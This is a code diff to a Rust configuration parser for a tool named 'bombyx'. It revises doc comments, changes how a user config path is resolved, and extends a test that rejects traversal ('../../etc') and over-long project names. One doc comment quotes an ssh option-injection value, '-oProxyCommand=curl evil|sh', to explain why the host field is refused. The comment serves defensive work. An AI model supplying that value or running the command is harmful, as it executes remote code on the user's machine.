@@ -214,8 +214,9 @@ impl Config {
     /// This function passes `HostSources::default()`, so a
     /// refused `host` key could not name the per-developer file.
     ///
-    /// The remaining hazard is that `source` and `host` are adjacent
-    /// `&str`, so `parse(host, path, source)` compiles. A `Host`
+    /// The remaining hazard is that `source` and `host` are both
+    /// `&str`, so swapping them type-checks:
+    /// `parse(host, path, source)` compiles. A `Host`
     /// newtype would stop that and is not worth its construction
     /// sites for a `#[cfg(test)]` constructor whose callers are all
     /// in this crate's own test suite.
@@ -319,7 +320,7 @@ impl Config {
                     HostOrigin::UserFile => {
                         sources.user_config_dir.map_or_else(
                             || origin.to_string(),
-                            |d| path_display(&d.join(USER_CONFIG_FILE)),
+                            |d| path_display(&registry::path(d)),
                         )
                     }
                     HostOrigin::Flag | HostOrigin::Env => origin.to_string(),
@@ -342,10 +343,10 @@ impl Config {
     /// The `host` rules matter most. `host` is passed as the
     /// first positional argument to `ssh`, which does not
     /// honour a `--` end-of-options separator. A value starting
-    /// with `-` is therefore read
-    /// as an *option*, so `-oProxyCommand=curl evil|sh` runs
-    /// code on this workstation from a bare `bombyx status`,
-    /// before any network traffic.
+    /// with `-` is therefore read as an *option*, so
+    /// `-oProxyCommand=curl evil|sh` runs code on this
+    /// workstation from a bare `bombyx status`, before any
+    /// network traffic.
     ///
     /// A cloned repo cannot supply that value, because `host` is
     /// refused in `bombyx.toml` (see
@@ -1163,15 +1164,24 @@ mod tests {
 
     #[test]
     fn rejects_a_project_that_is_not_one_segment() {
-        let src = "project = \"../../etc\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(matches!(
-            err,
-            ConfigError::Invalid {
-                field: "project",
-                ..
-            }
-        ));
+        // The length rule is here with the rest of the segment
+        // rules. The registry keys the same value with a type
+        // that enforces it, and two guards on one value must not
+        // disagree about what they allow.
+        for bad in ["../../etc", &"a".repeat(crate::name::MAX_NAME_LEN + 1)] {
+            let src = format!("project = {bad:?}\n");
+            let err = parse(&src).unwrap_err();
+            assert!(
+                matches!(
+                    err,
+                    ConfigError::Invalid {
+                        field: "project",
+                        ..
+                    }
+                ),
+                "{bad:?} was accepted"
+            );
+        }
     }
 
     #[test]
